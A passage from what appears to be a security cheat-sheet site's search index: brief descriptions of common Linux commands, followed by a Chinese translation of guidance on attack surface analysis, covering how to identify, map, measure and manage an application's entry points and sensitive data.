contents of a directory recursively.</p> <p><code>mv</code></p> <p>Move or rename files or directories.</p> <p><code>cp</code></p> <p>Copy files or directories.</p> <p><code>nano</code></p> <p>Terminal based text editor.</p> <p><code>which</code></p> <p>Returns the path to a file or link.</p> <p><code>find</code></p> <p>Searches for files in a directory hierarchy.</p> <p><code>updatedb</code></p> <p>Updates the locale database for existing contents on the system.</p> <p><code>locate</code></p> <p>Uses the locale database to find contents on the system.</p> <p><code>more</code></p> <p>Pager that is used to read STDOUT or files.</p> <p><code>less</code></p> <p>An alternative to <code>more</code> with more features.</p> <p><code>head</code></p> <p>Prints the first ten lines of STDOUT or a file.</p> <p><code>tail</code></p> <p>Prints the last ten lines of STDOUT or a file.</p> <p><code>sort</code></p> <p>Sorts the contents of STDOUT or a file.</p> <p><code>grep</code></p> <p>Searches for specific results that contain given patterns.</p> <p><code>cut</code></p> <p>Removes sections from each line of files.</p> <p><code>tr</code></p> <p>Replaces certain characters.</p> <p><code>column</code></p> <p>Command-line based utility that formats its input into multiple columns.</p> <p><code>awk</code></p> <p>Pattern scanning and processing language.</p> <p><code>sed</code></p> <p>A stream editor for filtering and transforming text.</p> <p><code>wc</code></p> <p>Prints newline, word, and byte counts for a given input.</p> <p><code>chmod</code></p> <p>Changes permission of a file or directory.</p> <p><code>chown</code></p> <p>Changes the owner and group of a file or directory.</p>"},{"location":"CheetSheet/%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/","title":"\u653b\u51fb\u9762\u5206\u6790","text":""},{"location":"CheetSheet/%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/#_1","title":"\u4ec0\u4e48\u662f\u653b\u51fb\u9762\u5206\u6790\u53ca\u5176\u91cd\u8981\u6027\u00b6","text":"<p>\u672c\u6587\u4ecb\u7ecd\u4e86\u4e00\u79cd\u7b80\u5355\u5b9e\u7528\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u653b\u51fb\u9762\u5206\u6790\u548c\u7ba1\u7406\u5e94\u7528\u7a0b\u5e8f\u7684\u653b\u51fb\u9762\u3002\u5b83\u65e8\u5728\u4f9b\u5f00\u53d1\u4eba\u5458\u5728\u8bbe\u8ba1\u548c\u66f4\u6539\u5e94\u7528\u7a0b\u5e8f\u65f6\u4e86\u89e3\u548c\u7ba1\u7406\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u98ce\u9669\uff0c\u4ee5\u53ca\u4f9b\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u4e13\u5bb6\u8fdb\u884c\u5b89\u5168\u98ce\u9669\u8bc4\u4f30\u3002\u8fd9\u91cc\u7684\u91cd\u70b9\u662f\u4fdd\u62a4\u5e94\u7528\u7a0b\u5e8f\u514d\u53d7\u5916\u90e8\u653b\u51fb\u2014\u2014\u5b83\u6ca1\u6709\u8003\u8651\u5bf9\u7cfb\u7edf\u7528\u6237\u6216\u64cd\u4f5c\u5458\u7684\u653b\u51fb\uff08\u4f8b\u5982\u6076\u610f\u8f6f\u4ef6\u6ce8\u5165\u3001\u793e\u4f1a\u5de5\u7a0b\u653b\u51fb\uff09\uff0c\u5e76\u4e14\u8f83\u5c11\u5173\u6ce8\u5185\u90e8\u5a01\u80c1\uff0c\u5c3d\u7ba1\u539f\u5219\u4ecd\u7136\u5b58\u5728\u76f8\u540c\u3002\u5185\u90e8\u653b\u51fb\u9762\u53ef\u80fd\u4e0e\u5916\u90e8\u653b\u51fb\u9762\u4e0d\u540c\uff0c\u4e00\u4e9b\u7528\u6237\u53ef\u80fd\u6709\u5f88\u591a\u8bbf\u95ee\u6743\u9650\u3002</p> <p>\u653b\u51fb\u9762\u5206\u6790\u662f\u5173\u4e8e\u6620\u5c04\u7cfb\u7edf\u7684\u54ea\u4e9b\u90e8\u5206\u9700\u8981\u5ba1\u67e5\u548c\u6d4b\u8bd5\u5b89\u5168\u6f0f\u6d1e\u3002\u653b\u51fb\u9762\u5206\u6790\u7684\u91cd\u70b9\u662f\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u98ce\u9669\u533a\u57df\uff0c\u8ba9\u5f00\u53d1\u4eba\u5458\u548c\u5b89\u5168\u4e13\u5bb6\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u54ea\u4e9b\u90e8\u5206\u5bb9\u6613\u53d7\u5230\u653b\u51fb\uff0c\u627e\u5230\u6700\u5c0f\u5316\u653b\u51fb\u7684\u65b9\u6cd5\uff0c\u5e76\u6ce8\u610f\u653b\u51fb\u9762\u4f55\u65f6\u4ee5\u53ca\u5982\u4f55\u53d8\u5316\u4ee5\u53ca\u4ece\u98ce\u9669\u7684\u89d2\u5ea6\u6765\u770b\u8fd9\u610f\u5473\u7740\u4ec0\u4e48\u3002</p> <p>\u653b\u51fb\u9762\u5206\u6790\u901a\u5e38\u7531\u5b89\u5168\u67b6\u6784\u5e08\u548c\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u5b8c\u6210\u3002\u4f46\u662f\u5f00\u53d1\u4eba\u5458\u5728\u8bbe\u8ba1\u3001\u6784\u5efa\u548c\u66f4\u6539\u7cfb\u7edf\u65f6\u5e94\u8be5\u4e86\u89e3\u548c\u76d1\u63a7\u653b\u51fb\u9762\u3002</p> <p>\u653b\u51fb\u9762\u5206\u6790\u53ef\u5e2e\u52a9\u60a8\uff1a</p> <ol> <li>\u786e\u5b9a\u7cfb\u7edf\u7684\u54ea\u4e9b\u529f\u80fd\u548c\u54ea\u4e9b\u90e8\u5206\u9700\u8981\u5ba1\u67e5/\u6d4b\u8bd5\u5b89\u5168\u6f0f\u6d1e</li> <li>\u8bc6\u522b\u9700\u8981\u7eb5\u6df1\u9632\u5fa1\u4fdd\u62a4\u7684\u9ad8\u98ce\u9669\u4ee3\u7801\u533a\u57df\u2014\u2014\u60a8\u9700\u8981\u4fdd\u62a4\u7cfb\u7edf\u7684\u54ea\u4e9b\u90e8\u5206</li> <li>\u786e\u5b9a\u4f55\u65f6\u66f4\u6539\u4e86\u653b\u51fb\u9762\u5e76\u9700\u8981\u8fdb\u884c\u67d0\u79cd\u5a01\u80c1\u8bc4\u4f30</li> </ol>"},{"location":"CheetSheet/%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/#_2","title":"\u5b9a\u4e49\u5e94\u7528\u7a0b\u5e8f\u7684\u653b\u51fb\u9762\u00b6","text":"<p>\u653b\u51fb\u9762\u63cf\u8ff0\u4e86\u653b\u51fb\u8005\u53ef\u4ee5\u8fdb\u5165\u7cfb\u7edf\u7684\u6240\u6709\u4e0d\u540c\u70b9\uff0c\u4ee5\u53ca\u4ed6\u4eec\u53ef\u4ee5\u4ece\u54ea\u91cc\u83b7\u53d6\u6570\u636e\u3002</p> <p>\u5e94\u7528\u7a0b\u5e8f\u7684\u653b\u51fb\u9762\u662f\uff1a</p> <ol> <li>\u6570\u636e/\u547d\u4ee4\u8fdb\u51fa\u5e94\u7528\u7a0b\u5e8f\u7684\u6240\u6709\u8def\u5f84\u7684\u603b\u548c\uff0c\u4ee5\u53ca</li> <li>\u4fdd\u62a4\u8fd9\u4e9b\u8def\u5f84\u7684\u4ee3\u7801\uff08\u5305\u62ec\u8d44\u6e90\u8fde\u63a5\u548c\u8eab\u4efd\u9a8c\u8bc1\u3001\u6388\u6743\u3001\u6d3b\u52a8\u65e5\u5fd7\u8bb0\u5f55\u3001\u6570\u636e\u9a8c\u8bc1\u548c\u7f16\u7801\uff09</li> <li>\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u6709\u4ef7\u503c\u7684\u6570\u636e\uff0c\u5305\u62ec\u79d8\u5bc6\u548c\u5bc6\u94a5\u3001\u77e5\u8bc6\u4ea7\u6743\u3001\u5173\u952e\u4e1a\u52a1\u6570\u636e\u3001\u4e2a\u4eba\u6570\u636e\u548c PII\uff0c\u4ee5\u53ca</li> <li>\u4fdd\u62a4\u8fd9\u4e9b\u6570\u636e\u7684\u4ee3\u7801\uff08\u5305\u62ec\u52a0\u5bc6\u548c\u6821\u9a8c\u548c\u3001\u8bbf\u95ee\u5ba1\u8ba1\u3001\u6570\u636e\u5b8c\u6574\u6027\u548c\u64cd\u4f5c\u5b89\u5168\u63a7\u5236\uff09\u3002</li> </ol> <p>\u60a8\u5c06\u6b64\u6a21\u578b\u4e0e\u53ef\u4ee5\u8bbf\u95ee\u7cfb\u7edf\uff08\u65e0\u8bba\u662f\u5426\u5df2\u6388\u6743\uff09\u7684\u4e0d\u540c\u7c7b\u578b\u7684\u7528\u6237\uff08\u89d2\u8272\u3001\u6743\u9650\u7ea7\u522b\uff09\u53e0\u52a0\u5728\u4e00\u8d77\u3002\u590d\u6742\u6027\u968f\u7740\u4e0d\u540c\u7c7b\u578b\u7528\u6237\u7684\u6570\u91cf\u800c\u589e\u52a0\u3002\u4f46\u91cd\u8981\u7684\u662f\u8981\u7279\u522b\u5173\u6ce8\u4e24\u4e2a\u6781\u7aef\uff1a\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u533f\u540d\u7528\u6237\u548c\u9ad8\u6743\u9650\u7ba1\u7406\u5458\u7528\u6237\uff08\u4f8b\u5982\u6570\u636e\u5e93\u7ba1\u7406\u5458\u3001\u7cfb\u7edf\u7ba1\u7406\u5458\uff09\u3002</p> <p>\u6839\u636e\u98ce\u9669\uff08\u9762\u5411\u5916\u90e8\u6216\u5185\u90e8\uff09\u3001\u76ee\u7684\u3001\u5b9e\u65bd\u3001\u8bbe\u8ba1\u548c\u6280\u672f\uff0c\u5c06\u6bcf\u79cd\u7c7b\u578b\u7684\u653b\u51fb\u70b9\u5206\u7ec4\u5230\u6876\u4e2d\u3002\u7136\u540e\uff0c\u60a8\u53ef\u4ee5\u8ba1\u7b97\u6bcf\u79cd\u7c7b\u578b\u7684\u653b\u51fb\u70b9\u6570\u91cf\uff0c\u7136\u540e\u4e3a\u6bcf\u79cd\u7c7b\u578b\u9009\u62e9\u4e00\u4e9b\u6848\u4f8b\uff0c\u5e76\u5c06\u60a8\u7684\u5ba1\u67e5/\u8bc4\u4f30\u91cd\u70b9\u653e\u5728\u8fd9\u4e9b\u6848\u4f8b\u4e0a\u3002</p> <p>\u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u60a8\u65e0\u9700\u4e86\u89e3\u6bcf\u4e2a\u7aef\u70b9\u5373\u53ef\u4e86\u89e3\u653b\u51fb\u9762\u548c\u7cfb\u7edf\u7684\u6f5c\u5728\u98ce\u9669\u6982\u51b5\u3002\u76f8\u53cd\uff0c\u60a8\u53ef\u4ee5\u8ba1\u7b97\u4e0d\u540c\u7684\u4e00\u822c\u7c7b\u578b\u7684\u7aef\u70b9\u548c\u6bcf\u79cd\u7c7b\u578b\u7684\u70b9\u6570\u3002\u6709\u4e86\u5b83\uff0c\u60a8\u53ef\u4ee5\u9884\u7b97\u8bc4\u4f30\u5927\u89c4\u6a21\u98ce\u9669\u6240\u9700\u7684\u8d39\u7528\uff0c\u5e76\u4e14\u53ef\u4ee5\u5224\u65ad\u5e94\u7528\u7a0b\u5e8f\u7684\u98ce\u9669\u72b6\u51b5\u4f55\u65f6\u53d1\u751f\u91cd\u5927\u53d8\u5316\u3002</p>"},{"location":"CheetSheet/%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/#_3","title":"\u5fae\u670d\u52a1\u548c\u4e91\u539f\u751f\u5e94\u7528\u00b6","text":"<p>\u5fae\u670d\u52a1\u548c\u4e91\u539f\u751f\u5e94\u7528\u7a0b\u5e8f\u7531\u591a\u4e2a\u8f83\u5c0f\u7684\u7ec4\u4ef6\u7ec4\u6210\uff0c\u4f7f\u7528 API \u677e\u6563\u8026\u5408\u5e76\u53ef\u72ec\u7acb\u6269\u5c55\u3002\u5728\u8bc4\u4f30\u8fd9\u79cd\u67b6\u6784\u98ce\u683c\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u653b\u51fb\u9762\u65f6\uff0c\u60a8\u5e94\u8be5\u4f18\u5148\u8003\u8651\u53ef\u4ece\u653b\u51fb\u6e90\uff08\u4f8b\u5982\u6765\u81ea Internet \u7684\u5916\u90e8\u6d41\u91cf\uff09\u5230\u8fbe\u7684\u7ec4\u4ef6\u3002\u8fd9\u4e9b\u7ec4\u4ef6\u53ef\u80fd\u4f4d\u4e8e\u4ee3\u7406\u5c42\u3001\u8d1f\u8f7d\u5747\u8861\u5668\u548c\u5165\u53e3\u63a7\u5236\u5668\u7684\u540e\u9762\uff0c\u5e76\u4e14\u53ef\u80fd\u4f1a\u5728\u6ca1\u6709\u8b66\u544a\u7684\u60c5\u51b5\u4e0b\u81ea\u52a8\u7f29\u653e\u3002</p> <p>Scope\u6216ThreatMapper\u7b49\u5f00\u6e90\u5de5\u5177\u6709\u52a9\u4e8e\u53ef\u89c6\u5316\u653b\u51fb\u9762\u3002</p>"},{"location":"CheetSheet/%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/#_4","title":"\u8bc6\u522b\u548c\u6620\u5c04\u653b\u51fb\u9762\u00b6","text":"<p>\u60a8\u53ef\u4ee5\u5f00\u59cb\u5728\u56fe\u7247\u548c\u6ce8\u91ca\u4e2d\u6784\u5efa\u653b\u51fb\u9762\u7684\u57fa\u7ebf\u63cf\u8ff0\u3002\u82b1\u51e0\u4e2a\u5c0f\u65f6\u4ece\u653b\u51fb\u8005\u7684\u89d2\u5ea6\u5ba1\u9605\u8bbe\u8ba1\u548c\u67b6\u6784\u6587\u6863\u3002\u901a\u8bfb\u6e90\u4ee3\u7801\u5e76\u786e\u5b9a\u4e0d\u540c\u7684\u5165\u53e3/\u51fa\u53e3\u70b9\uff1a</p> <ul> <li>\u7528\u6237\u754c\u9762 (UI) \u8868\u5355\u548c\u5b57\u6bb5</li> <li>HTTP \u6807\u5934\u548c cookie</li> <li>\u871c\u8702</li> <li>\u6587\u4ef6</li> <li>\u6570\u636e\u5e93</li> <li>\u5176\u4ed6\u672c\u5730\u5b58\u50a8</li> <li>\u7535\u5b50\u90ae\u4ef6\u6216\u5176\u4ed6\u7c7b\u578b\u7684\u6d88\u606f</li> <li>\u8fd0\u884c\u65f6\u53c2\u6570</li> <li>...\u60a8\u7684\u5165\u53e3/\u51fa\u53e3\u70b9</li> </ul> <p>\u4e0d\u540c\u653b\u51fb\u70b9\u7684\u603b\u6570\u52a0\u8d77\u6765\u5f88\u5bb9\u6613\u8fbe\u5230\u6570\u5343\u751a\u81f3\u66f4\u591a\u3002\u4e3a\u4e86\u4f7f\u5176\u6613\u4e8e\u7ba1\u7406\uff0c\u6839\u636e\u529f\u80fd\u3001\u8bbe\u8ba1\u548c\u6280\u672f\u5c06\u6a21\u578b\u5206\u6210\u4e0d\u540c\u7684\u7c7b\u578b\uff1a</p> <ul> <li>\u767b\u5f55/\u8eab\u4efd\u9a8c\u8bc1\u5165\u53e3\u70b9</li> <li>\u7ba1\u7406\u754c\u9762</li> <li>\u67e5\u8be2\u53ca\u641c\u5bfb\u529f\u80fd</li> <li>\u6570\u636e\u8f93\u5165 (CRUD) \u8868\u5355</li> <li>\u4e1a\u52a1\u6d41\u7a0b</li> <li>\u4e8b\u52a1\u63a5\u53e3/API</li> <li>\u64cd\u4f5c\u547d\u4ee4\u548c\u76d1\u63a7\u63a5\u53e3/API</li> <li>\u4e0e\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f/\u7cfb\u7edf\u7684\u63a5\u53e3</li> <li>...\u4f60\u7684\u7c7b\u578b</li> </ul> <p>\u60a8\u8fd8\u9700\u8981\u901a\u8fc7\u91c7\u8bbf\u7cfb\u7edf\u7684\u5f00\u53d1\u4eba\u5458\u548c\u7528\u6237\uff0c\u5e76\u518d\u6b21\u5ba1\u67e5\u6e90\u4ee3\u7801\uff0c\u6765\u8bc6\u522b\u5e94\u7528\u7a0b\u5e8f\u4e2d\u6709\u4ef7\u503c\u7684\u6570\u636e\uff08\u4f8b\u5982\u673a\u5bc6\u3001\u654f\u611f\u3001\u53d7\u76d1\u7ba1\uff09\u3002</p> <p>\u60a8\u8fd8\u53ef\u4ee5\u901a\u8fc7\u626b\u63cf\u5e94\u7528\u7a0b\u5e8f\u6765\u6784\u5efa\u653b\u51fb\u9762\u7684\u56fe\u7247\u3002\u5bf9\u4e8e Web \u5e94\u7528\u7a0b\u5e8f\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528OWASP ZAP\u6216Arachni\u6216Skipfish\u6216w3af\u7b49\u5de5\u5177\u6216\u4f17\u591a\u5546\u4e1a\u52a8\u6001\u6d4b\u8bd5\u548c\u6f0f\u6d1e\u626b\u63cf\u5de5\u5177\u6216\u670d\u52a1\u4e4b\u4e00\u6765\u6293\u53d6\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u5e76\u6620\u5c04\u53ef\u901a\u8fc7 Web \u8bbf\u95ee\u7684\u5e94\u7528\u7a0b\u5e8f\u90e8\u5206\u3002\u67d0\u4e9b Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899 (WAF) \u4e5f\u53ef\u80fd\u80fd\u591f\u5bfc\u51fa\u5e94\u7528\u7a0b\u5e8f\u5165\u53e3\u70b9\u7684\u6a21\u578b\u3002</p> <p>\u901a\u8fc7\u6d4f\u89c8\u7cfb\u7edf\u4e2d\u7684\u4e00\u4e9b\u4e3b\u8981\u7528\u4f8b\u6765\u9a8c\u8bc1\u5e76\u8865\u5145\u60a8\u5bf9\u653b\u51fb\u9762\u7684\u7406\u89e3\uff1a\u6ce8\u518c\u548c\u521b\u5efa\u7528\u6237\u914d\u7f6e\u6587\u4ef6\u3001\u767b\u5f55\u3001\u641c\u7d22\u9879\u76ee\u3001\u4e0b\u8ba2\u5355\u3001\u66f4\u6539\u8ba2\u5355\u7b49. \u8ddf\u8e2a\u7cfb\u7edf\u4e2d\u7684\u63a7\u5236\u6d41\u548c\u6570\u636e\u6d41\uff0c\u4e86\u89e3\u4fe1\u606f\u7684\u9a8c\u8bc1\u65b9\u5f0f\u548c\u5b58\u50a8\u4f4d\u7f6e\u3001\u89e6\u53ca\u7684\u8d44\u6e90\u4ee5\u53ca\u6d89\u53ca\u7684\u5176\u4ed6\u7cfb\u7edf\u3002Attack Surface Analysis \u548cApplication Threat Modeling\u4e4b\u95f4\u5b58\u5728\u9012\u5f52\u5173\u7cfb\uff1aAttack Surface \u7684\u53d8\u5316\u5e94\u8be5\u89e6\u53d1\u5a01\u80c1\u5efa\u6a21\uff0c\u800c\u5a01\u80c1\u5efa\u6a21\u53ef\u4ee5\u5e2e\u52a9\u60a8\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684 Attack Surface\u3002</p> <p>\u653b\u51fb\u9762\u6a21\u578b\u5f00\u59cb\u65f6\u53ef\u80fd\u6bd4\u8f83\u7c97\u7cd9\u4e14\u4e0d\u5b8c\u6574\uff0c\u5c24\u5176\u662f\u5982\u679c\u60a8\u4e4b\u524d\u6ca1\u6709\u5bf9\u5e94\u7528\u7a0b\u5e8f\u505a\u8fc7\u4efb\u4f55\u5b89\u5168\u5de5\u4f5c\u7684\u8bdd\u3002\u5f53\u60a8\u5728\u5b89\u5168\u5206\u6790\u4e2d\u6df1\u5165\u6316\u6398\u65f6\uff0c\u6216\u8005\u5f53\u60a8\u66f4\u591a\u5730\u4f7f\u7528\u5e94\u7528\u7a0b\u5e8f\u5e76\u610f\u8bc6\u5230\u60a8\u5bf9\u653b\u51fb\u9762\u7684\u7406\u89e3\u6709\u6240\u63d0\u9ad8\u65f6\uff0c\u586b\u8865\u6f0f\u6d1e\u3002</p>"},{"location":"CheetSheet/%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/#_5","title":"\u6d4b\u91cf\u548c\u8bc4\u4f30\u653b\u51fb\u9762\u00b6","text":"<p>\u7ed8\u5236\u653b\u51fb\u9762\u56fe\u540e\uff0c\u786e\u5b9a\u9ad8\u98ce\u9669\u533a\u57df\u3002\u5173\u6ce8\u8fdc\u7a0b\u5165\u53e3\u70b9\u2014\u2014\u4e0e\u5916\u90e8\u7cfb\u7edf\u548c\u4e92\u8054\u7f51\u7684\u63a5\u53e3\u2014\u2014\u5c24\u5176\u662f\u7cfb\u7edf\u5141\u8bb8\u533f\u540d\u3001\u516c\u5171\u8bbf\u95ee\u7684\u5730\u65b9\u3002</p> <ul> <li>\u9762\u5411\u7f51\u7edc\uff0c\u5c24\u5176\u662f\u9762\u5411\u4e92\u8054\u7f51\u7684\u4ee3\u7801</li> <li>\u7f51\u7edc\u8868\u683c</li> <li>\u6765\u81ea\u7f51\u7edc\u5916\u90e8\u7684\u6587\u4ef6</li> <li>\u4e0e\u5176\u4ed6\u7cfb\u7edf\u7684\u5411\u540e\u517c\u5bb9\u63a5\u53e3\u2014\u2014\u65e7\u534f\u8bae\uff0c\u6709\u65f6\u662f\u65e7\u4ee3\u7801\u548c\u5e93\uff0c\u96be\u4ee5\u7ef4\u62a4\u548c\u6d4b\u8bd5\u591a\u4e2a\u7248\u672c</li> <li>\u81ea\u5b9a\u4e49 API\u2014\u2014\u534f\u8bae\u7b49\u2014\u2014\u53ef\u80fd\u5728\u8bbe\u8ba1\u548c\u5b9e\u73b0\u4e2d\u5b58\u5728\u9519\u8bef</li> <li>\u5b89\u5168\u4ee3\u7801\uff1a\u4e0e\u5bc6\u7801\u5b66\u3001\u8eab\u4efd\u9a8c\u8bc1\u3001\u6388\u6743\uff08\u8bbf\u95ee\u63a7\u5236\uff09\u548c\u4f1a\u8bdd\u7ba1\u7406\u6709\u5173\u7684\u4efb\u4f55\u4e8b\u60c5</li> </ul> <p>\u8fd9\u4e9b\u901a\u5e38\u662f\u60a8\u6700\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u7684\u5730\u65b9\u3002\u7136\u540e\u4e86\u89e3\u60a8\u5b9e\u65bd\u4e86\u54ea\u4e9b\u8865\u507f\u63a7\u5236\u63aa\u65bd\u3001\u7f51\u7edc\u9632\u706b\u5899\u548c\u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\u7b49\u64cd\u4f5c\u63a7\u5236\u63aa\u65bd\uff0c\u4ee5\u53ca\u6709\u52a9\u4e8e\u4fdd\u62a4\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u5165\u4fb5\u68c0\u6d4b\u6216\u9884\u9632\u7cfb\u7edf\u3002</p> <p>Microsoft \u7684 Michael Howard \u548c\u5176\u4ed6\u7814\u7a76\u4eba\u5458\u5f00\u53d1\u4e86\u4e00\u79cd\u65b9\u6cd5\u6765\u6d4b\u91cf\u5e94\u7528\u7a0b\u5e8f\u7684\u653b\u51fb\u9762\uff0c\u5e76\u8ddf\u8e2a\u653b\u51fb\u9762\u968f\u65f6\u95f4\u7684\u53d8\u5316\uff0c\u79f0\u4e3a\u76f8\u5bf9\u653b\u51fb\u9762\u5546\u6570 (RSQ)\u3002\u4f7f\u7528\u6b64\u65b9\u6cd5\uff0c\u60a8\u53ef\u4ee5\u8ba1\u7b97\u7cfb\u7edf\u7684\u603b\u4f53\u653b\u51fb\u9762\u5206\u6570\uff0c\u5e76\u5728\u5bf9\u7cfb\u7edf\u53ca\u5176\u90e8\u7f72\u65b9\u5f0f\u8fdb\u884c\u66f4\u6539\u65f6\u8861\u91cf\u6b64\u5206\u6570\u3002\u5361\u5185\u57fa\u6885\u9686\u5927\u5b66\u7684\u7814\u7a76\u4eba\u5458\u5728\u8fd9\u9879\u5de5\u4f5c\u7684\u57fa\u7840\u4e0a\u5f00\u53d1\u4e86\u4e00\u79cd\u8ba1\u7b97\u653b\u51fb\u9762\u6307\u6807\u7684\u6b63\u5f0f\u65b9\u6cd5\u5bf9\u4e8e\u50cf SAP \u8fd9\u6837\u7684\u5927\u578b\u7cfb\u7edf\u3002\u4ed6\u4eec\u5c06\u653b\u51fb\u9762\u8ba1\u7b97\u4e3a\u6240\u6709\u5165\u53e3\u70b9\u548c\u51fa\u53e3\u70b9\u3001\u901a\u9053\uff08\u5ba2\u6237\u7aef\u6216\u5916\u90e8\u7cfb\u7edf\u8fde\u63a5\u5230\u7cfb\u7edf\u7684\u4e0d\u540c\u65b9\u5f0f\uff0c\u5305\u62ec TCP/UDP \u7aef\u53e3\u3001RPC \u7aef\u70b9\u3001\u547d\u540d\u7ba1\u9053......\uff09\u548c\u4e0d\u53d7\u4fe1\u4efb\u7684\u6570\u636e\u5143\u7d20\u7684\u603b\u548c. \u7136\u540e\uff0c\u4ed6\u4eec\u5bf9\u8fd9\u4e9b\u653b\u51fb\u9762\u5143\u7d20\u5e94\u7528\u7834\u574f\u6f5c\u529b/\u52aa\u529b\u6bd4\u7387\u6765\u8bc6\u522b\u9ad8\u98ce\u9669\u533a\u57df\u3002</p> <p>\u8bf7\u6ce8\u610f\uff0c\u90e8\u7f72\u5e94\u7528\u7a0b\u5e8f\u7684\u591a\u4e2a\u7248\u672c\uff0c\u4fdd\u7559\u4e0d\u518d\u4f7f\u7528\u7684\u529f\u80fd\u4ee5\u9632\u5c06\u6765\u53ef\u80fd\u9700\u8981\u5b83\u4eec\uff0c\u6216\u8005\u4fdd\u7559\u65e7\u7684\u5907\u4efd\u526f\u672c\u548c\u672a\u4f7f\u7528\u7684\u4ee3\u7801\u4f1a\u589e\u52a0\u653b\u51fb\u9762\u3002\u5e94\u4f7f\u7528\u6e90\u4ee3\u7801\u63a7\u5236\u548c\u7a33\u5065\u7684\u53d8\u66f4\u7ba1\u7406/\u914d\u7f6e\u5b9e\u8df5\u6765\u786e\u4fdd\u5b9e\u9645\u90e8\u7f72\u7684\u653b\u51fb\u9762\u4e0e\u7406\u8bba\u653b\u51fb\u9762\u5c3d\u53ef\u80fd\u63a5\u8fd1\u3002</p> <p>\u4ee3\u7801\u548c\u6570\u636e\u7684\u5907\u4efd - \u5728\u7ebf\u548c\u79bb\u7ebf\u5a92\u4f53 - \u662f\u7cfb\u7edf\u653b\u51fb\u9762\u7684\u4e00\u4e2a\u91cd\u8981\u4f46\u7ecf\u5e38\u88ab\u5ffd\u89c6\u7684\u90e8\u5206\u3002\u5982\u679c\u60a8\u901a\u8fc7\u4e0d\u4fdd\u62a4\u60a8\u7684\u5907\u4efd\u5c06\u4e00\u5207\u4ea4\u7ed9\u574f\u4eba\uff0c\u90a3\u4e48\u901a\u8fc7\u7f16\u5199\u5b89\u5168\u8f6f\u4ef6\u548c\u52a0\u56fa\u57fa\u7840\u67b6\u6784\u6765\u4fdd\u62a4\u60a8\u7684\u6570\u636e\u548c IP \u5c06\u5168\u90e8\u4ed8\u8bf8\u4e1c\u6d41\u3002</p>"},{"location":"CheetSheet/%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/#_6","title":"\u7ba1\u7406\u653b\u51fb\u9762\u00b6","text":"<p>\u4e00\u65e6\u60a8\u5bf9\u653b\u51fb\u9762\u6709\u4e86\u57fa\u672c\u7684\u4e86\u89e3\uff0c\u60a8\u5c31\u53ef\u4ee5\u5728\u5bf9\u5e94\u7528\u7a0b\u5e8f\u8fdb\u884c\u66f4\u6539\u65f6\u4f7f\u7528\u5b83\u6765\u9010\u6b65\u8bc6\u522b\u548c\u7ba1\u7406\u672a\u6765\u7684\u98ce\u9669\u3002\u95ee\u4f60\u81ea\u5df1\uff1a</p> <ul> <li>\u53d1\u751f\u4e86\u4ec0\u4e48\u53d8\u5316\uff1f</li> <li>\u4f60\u6709\u4ec0\u4e48\u4e0d\u540c\uff1f\uff08\u6280\u672f\uff0c\u65b0\u65b9\u6cd5\uff0c......\uff09</li> <li>\u4f60\u80fd\u6253\u5f00\u4ec0\u4e48\u6d1e\uff1f</li> </ul> <p>\u60a8\u521b\u5efa\u7684\u7b2c\u4e00\u4e2a\u7f51\u9875\u4f1a\u663e\u7740\u6253\u5f00\u7cfb\u7edf\u7684\u653b\u51fb\u9762\u5e76\u5f15\u5165\u5404\u79cd\u65b0\u98ce\u9669\u3002\u5982\u679c\u60a8\u5411\u8be5\u9875\u9762\u6216\u7c7b\u4f3c\u7684\u5176\u4ed6\u7f51\u9875\u6dfb\u52a0\u53e6\u4e00\u4e2a\u5b57\u6bb5\uff0c\u867d\u7136\u4ece\u6280\u672f\u4e0a\u8bb2\u60a8\u5df2\u7ecf\u6269\u5927\u4e86\u653b\u51fb\u9762\uff0c\u4f46\u60a8\u5e76\u6ca1\u6709\u4ee5\u6709\u610f\u4e49\u7684\u65b9\u5f0f\u589e\u52a0\u5e94\u7528\u7a0b\u5e8f\u7684\u98ce\u9669\u72b6\u51b5\u3002\u9664\u975e\u60a8\u9075\u5faa\u65b0\u8bbe\u8ba1\u6216\u4f7f\u7528\u65b0\u6846\u67b6\uff0c\u5426\u5219\u8fd9\u4e9b\u589e\u91cf\u66f4\u6539\u4e2d\u7684\u6bcf\u4e00\u4e2a\u90fd\u5927\u540c\u5c0f\u5f02\u3002</p> <p>\u5982\u679c\u60a8\u6dfb\u52a0\u53e6\u4e00\u4e2a\u7f51\u9875\uff0c\u8be5\u7f51\u9875\u9075\u5faa\u4e0e\u73b0\u6709\u7f51\u9875\u76f8\u540c\u7684\u8bbe\u8ba1\u5e76\u4f7f\u7528\u76f8\u540c\u7684\u6280\u672f\uff0c\u5219\u5f88\u5bb9\u6613\u7406\u89e3\u5b83\u9700\u8981\u591a\u5c11\u5b89\u5168\u6d4b\u8bd5\u548c\u5ba1\u67e5\u3002\u5982\u679c\u60a8\u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684 Web \u670d\u52a1 API \u6216\u53ef\u4ee5\u4ece Internet 